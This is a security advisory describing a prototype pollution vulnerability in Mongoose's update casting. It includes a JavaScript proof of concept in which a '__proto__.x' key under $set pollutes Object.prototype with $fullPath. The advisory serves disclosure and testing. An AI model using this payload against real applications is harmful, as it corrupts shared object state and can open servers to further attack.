title: "Mongoose: Prototype pollution in mongoose update casting via __proto__-prefixed
  dotted path (Schema._getSchema/path getter)"
description: "_What kind of vulnerability is it? Who is impacted?_\n\nPrototype pollution
  in update casting: passing a user-controlled update to a Mongoose update, like `MyModel.updateOne(filter,
  req.body)`, can cause Mongoose to set `$fullPath` and `$parentSchemaDocArray` on
  `Object.prototype`.\n\nExample:\n\n```javascript\nconst mongoose = require('mongoose');\nconsole.log('before:',
  Object.prototype.$fullPath);            // undefined\n\nconst User = mongoose.model('User',
  new mongoose.Schema({ name: String }));\nconst malicious = JSON.parse('{\"$set\":
  {\"__proto__.x\": \"anything\"}}');   // attacker-controlled update\n\nconst q =
  User.updateOne({}, {});\ntry { q._castUpdate(malicious); } catch (e) { /* throws
  AFTER the pollution side-effect */ }\n\nconsole.log('after :', Object.prototype.$fullPath);
  \           // \"__proto__\"\nconsole.log('enumerable:', Object.prototype.propertyIsEnumerable('$fullPath'));
  \ // true\nconsole.log('fresh {}:', ({}).$fullPath);                      // \"__proto__\"\n```"
